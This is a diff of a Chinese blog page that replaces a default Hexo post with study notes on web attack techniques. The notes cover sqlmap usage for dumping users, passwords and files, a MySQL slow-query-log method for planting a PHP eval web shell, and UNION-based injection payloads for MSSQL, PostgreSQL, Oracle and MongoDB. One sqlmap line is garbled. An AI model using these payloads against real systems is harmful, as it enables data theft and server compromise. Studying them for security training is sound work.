@@ -9,7 +9,7 @@
     
     <title>
         
-            Hello World |
+            07Web安全攻防02 |
         
         Jackie&#39;s Blog
     </title>
@@ -223,7 +223,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        Hello World
+                        07Web安全攻防02
                     </div>
                 
 
@@ -249,28 +249,37 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-04-12</span>
+                <span class="datetime">2024-04-14</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Fri Apr 12 2024 21:41:18 GMT+0800">2024-04-12</span>
+                <span class="datetime" data-updated="Sun Apr 14 2024 15:58:01 GMT+0800">2024-04-14</span>
             </span>
         
 
         
 
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%B0%8F%E8%BF%AA/">小迪</a></li>
+                        
+                    
+                </ul>
+            </span>
         
 
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>75 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>7 分钟</span>
             </span>
         
         
@@ -287,25 +296,147 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <p>Welcome to <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                    <h1 id="Web攻防02"><a href="#Web攻防02" class="headerlink" title="Web攻防02"></a>Web攻防02</h1><h1 id="通用安全漏洞"><a href="#通用安全漏洞" class="headerlink" title="通用安全漏洞"></a>通用安全漏洞</h1><h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><blockquote>
+<p>不支持NoSQL、Redis</p>
+</blockquote>
+<p>脚本：tamper</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-u <span class="string">&quot;&lt;网址&gt;&quot;</span><span class="comment">#指定网址</span></span><br><span class="line">--purge<span class="comment">#清除缓存</span></span><br><span class="line">--privileges<span class="comment">#查看权限</span></span><br><span class="line">--is-dba<span class="comment">#是否是数据库管理员</span></span><br><span class="line">--dbs<span class="comment">#获取数据库名</span></span><br><span class="line">--tables<span class="comment">#获取数据库下的表，常搭配-D使用</span></span><br><span class="line">-D <span class="string">&quot;&lt;数据库名&gt;&quot;</span><span class="comment">#指定数据库</span></span><br><span class="line">-T <span class="string">&quot;&lt;表名&gt;&quot;</span><span class="comment">#指定表名</span></span><br><span class="line">--dump -C <span class="string">&quot;&lt;列名&gt;,&lt;列名&gt;&quot;</span><span class="comment">#指定列名</span></span><br><span class="line">---</span><br><span class="line">-r &lt;数据包文件&gt;<span class="comment">#以数据包形式进行注入（解决特定范围）</span></span><br><span class="line">---执行命令</span><br><span class="line">--os<span class="comment">#指定系统</span></span><br><span class="line">--os-cmd=<span class="built_in">id</span><span class="comment">#执行系统命令</span></span><br><span class="line">--os-shell<span class="comment">#系统交互shell</span></span><br><span class="line">--file-read/write<span class="comment">#读/写文件</span></span><br><span class="line">-sql-shell<span class="comment">#执行指定sql命令</span></span><br><span class="line">-reg-read<span class="comment">#读取win系统注册表</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p><a class="link"   target="_blank" rel="noopener" href="https://sqlmap.highlight.ink/" >SQLmap中文手册<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html" >SQLmap使用参数<i class="fas fa-external-link-alt"></i></a></p>
+<p>简单的注入流程：</p>
+<ol>
+<li>读取数据库版本，当前用户，当前数据库</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 -f -b --current-user --current-db -v 1</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>判断当前数据库用户权限（高权限才能进行文件的读取、命令执行等其他功能）</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --privileges -U 用户名 -v 1</span><br><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --is-dba -U 用户名 -v 1</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>读取所有数据库用户或指定数据库用户的密码</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --<span class="built_in">users</span> --passwords -v 2</span><br><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --passwords -U root -v 2</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+<ol start="4">
+<li>获取所有数据库</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --dbs -v 2</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>获取指定数据库中的所有表</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --tables -D mysql -v 2</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>获取指定数据库名中指定表的字段</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --columns -D mysql -T <span class="built_in">users</span> -v 2</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>获取指定数据库命中指定表中指定字段的数据</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --dump -D mysql -T <span class="built_in">users</span> -C <span class="string">&quot;username,password&quot;</span> -s <span class="string">&quot;sqlnmapdb.log&quot;</span> -v 2</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li>file-read读取web文件</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --file-read <span class="string">&quot;/etc/password&quot;</span> -v 2</span><br></pre></td></tr></table></figure>
+
+<ol start="9">
+<li>file-write写入文件到web</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://www.xxx.com/test/php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><blockquote>
+<p>偏移注入就是解决表名已知，列名未知的情况</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://t.csdnimg.cn/Jzbb1" >http://t.csdnimg.cn/Jzbb1<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6054320.html" >https://www.cnblogs.com/xishaonian/p/6054320.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/access-offset-injection.html" >https://www.fujieace.com/penetration-test/access-offset-injection.html<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>为了网站和数据库的安全性，MySQL内置有root最高用户，划分等级，每个用户对应管理一个数据库，这样保证互不关联，从而不会影响到其他数据库的运行</p>
+<p>MySQL两种思路：</p>
+<ol>
+<li>非root的注入攻击：常规类的猜解</li>
+<li>root用户的注入攻击：文件读写操作，跨库查询注入等</li>
+</ol>
+<p>MySQL5.0以上版本：自带的数据库名：information_schema</p>
+<blockquote>
+<p>information_schema库中的：</p>
+<p>schemata表会记录所有的数据库名（chehema_name）</p>
+<p>tables表会记录所有的表名（table_name）</p>
+<p>columns表会记录所有的列名（column_name）</p>
+</blockquote>
+<p>获取相关数据：</p>
+<ol>
+<li>数据库版本-看是否符合information_schema查询-version()</li>
+<li>数据库用户-看是否符合root型注入攻击-user()</li>
+<li>当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os()</li>
+<li>数据库名字-为后期猜解指定数据库下的表、列做准备-database()</li>
+</ol>
+<p>MySQL配置中的secure-file-priv：限制读取&#x2F;写入的文件</p>
+<blockquote>
+<p>Linux下：&#x2F;etc&#x2F;my.cnf</p>
+</blockquote>
+<p><strong>突破</strong>：注入中需要支持SQL执行环境，没有就需要借助PHPmyadmin或能够直接连上对方数据库进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_log_file=&#x27;shell路径&#x27;</span><br><span class="line">select &#x27;&lt;?php eval($_GET[A])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。</p>
+<p><strong>时间默认超过多少的称为慢查询日志？</strong></p>
+<p>一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。查看服务器默认时间值方式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%long_query_time%&#x27;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/skahwah/SQLRecon" >SQLRecon网络侦查与后渗透测试工具<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 4</span><br><span class="line">and 1=2 union all select null,null,null,null</span><br><span class="line">@@version--获取版本信息</span><br><span class="line">db_name()--当前数据库名字</span><br><span class="line">user、system_user、current_user、user_name--获取当前用户名</span><br><span class="line">@@SERVERNAME--获取服务器主机信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249371.html" >PostgreSQL注入<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span></span><br><span class="line">version()<span class="comment">--获取版本信息</span></span><br><span class="line"><span class="built_in">current_user</span><span class="comment">--获取用户名</span></span><br><span class="line">current_database()<span class="comment">--获取当前数据库名</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html" >Oracle注入总结<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测回显：and 1=2 union select &#x27;1&#x27;,&#x27;2&#x27; from dual</span><br><span class="line">爆库：and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1)from dual</span><br><span class="line">模糊爆库：and 1=2 union select &#x27;1&#x27;,(select table_name from user_tables where rownum=1 and table_name like &#x27;%user%&#x27;) from dual</span><br><span class="line">爆列名：and 1=2 union select &#x27;1&#x27;,(select column_name from all_tab_columns where rownum=1 and table_name=&#x27;sns_users&#x27;) from dual</span><br><span class="line">爆其他列名：and 1=2 union select &#x27;1&#x27;,(select column_name from all_tab_columns where rownum=1 and table_name=&#x27;sns_users&#x27; and column_name not in (&#x27;USER_NAME&#x27;))from dual</span><br><span class="line">爆数据：and 1=2 union select user_name,user_pwd from &quot;sns_users&quot;</span><br><span class="line">爆其他数据：and 1=2 union select user_name,user_pwd from &quot;sns_users&quot; where USER_NAME&lt;&gt;&#x27;hu&#x27; and user_name&lt;&gt;&#x27;mozhe&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/mongodb/mongodb-query.html" >MongoDB查询文档<i class="fas fa-external-link-alt"></i></a></p>
+<p>（Python），以墨者为例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db = $mongo-&gt;mozhe_cms_Authority;</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$query = &quot;var data = db.notice.findOne(&#123;&#x27;id&#x27;:&#x27;$id&#x27;&#125;);return data;&quot;;</span><br><span class="line">$obj = $db-&gt;execute($query);</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;body&quot;&gt;</span><br><span class="line">&lt;div class=&quot;title&quot;&gt;&lt;?php echo $obj[&#x27;retval&#x27;][&#x27;title&#x27;];?&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;content&quot;&gt;&lt;?php echo $obj[&#x27;retval&#x27;][&#x27;content&#x27;];?&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中findOne({‘id’:’$id’})，故需先闭合再执行查询语句，即1&#39;}) and …</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测回显：/new_list.php?id=1&#x27;&#125;);return (&#123;title:1,content:&#x27;2</span><br><span class="line">爆库：/new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.getCollectionNames()),content:&#x27;1</span><br><span class="line">爆字段：/new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#x27;1</span><br><span class="line">---</span><br><span class="line">db.getCollectionNames()返回的是数组，需要用tojson转换为字符串</span><br><span class="line">db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据类型注入"><a href="#数据类型注入" class="headerlink" title="数据类型注入"></a>数据类型注入</h2><ul>
+<li>数字型</li>
+<li>字符型</li>
+<li>搜索型</li>
+<li>加密型（base64、json）等</li>
+</ul>
+<h2 id="查询方式注入"><a href="#查询方式注入" class="headerlink" title="查询方式注入"></a>查询方式注入</h2><ul>
+<li>查询</li>
+<li>增加</li>
+<li>删除</li>
+<li>更新</li>
+<li>堆叠</li>
+</ul>
+<h2 id="复杂注入利用"><a href="#复杂注入利用" class="headerlink" title="复杂注入利用"></a>复杂注入利用</h2><ul>
+<li>二次注入</li>
+<li>dnslog注入</li>
+<li>绕过bypass等</li>
+</ul>
 
                 </div>
                 
 
                 <div class="post-bottom-tags-and-share border-box">
                     <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%B0%8F%E8%BF%AA/">小迪</a>
+                                    </li>
+                                
+                            </ul>
                         
                     </div>
                     <div>
@@ -341,22 +472,22 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2024/04/14/C%E8%AF%AD%E8%A8%80/"
-                                   title="C语言"
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/04/14/05PHP%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
+                                   title="05PHP个人博客"
                                 >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">C语言</span>
-                                        <span class="post-nav-item">上一篇</span>
+                                        <span class="post-nav-title-item text-ellipsis">05PHP个人博客</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
                                     </span>
                                 </a>
                             </div>
-                        
                         
                     </div>
                 
@@ -452,7 +583,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E6%94%BB%E9%98%B202"><span class="nav-text">Web攻防02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-text">通用安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap"><span class="nav-text">SQLmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL"><span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PostgreSQL"><span class="nav-text">PostgreSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MongoDB"><span class="nav-text">MongoDB</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">数据类型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="nav-text">查询方式注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E6%9D%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-text">复杂注入利用</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -624,7 +755,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E6%94%BB%E9%98%B202"><span class="nav-text">Web攻防02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-text">通用安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap"><span class="nav-text">SQLmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL"><span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PostgreSQL"><span class="nav-text">PostgreSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MongoDB"><span class="nav-text">MongoDB</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">数据类型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="nav-text">查询方式注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E6%9D%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-text">复杂注入利用</span></a></li></ol></li></ol>
     </div>
 </div>
 
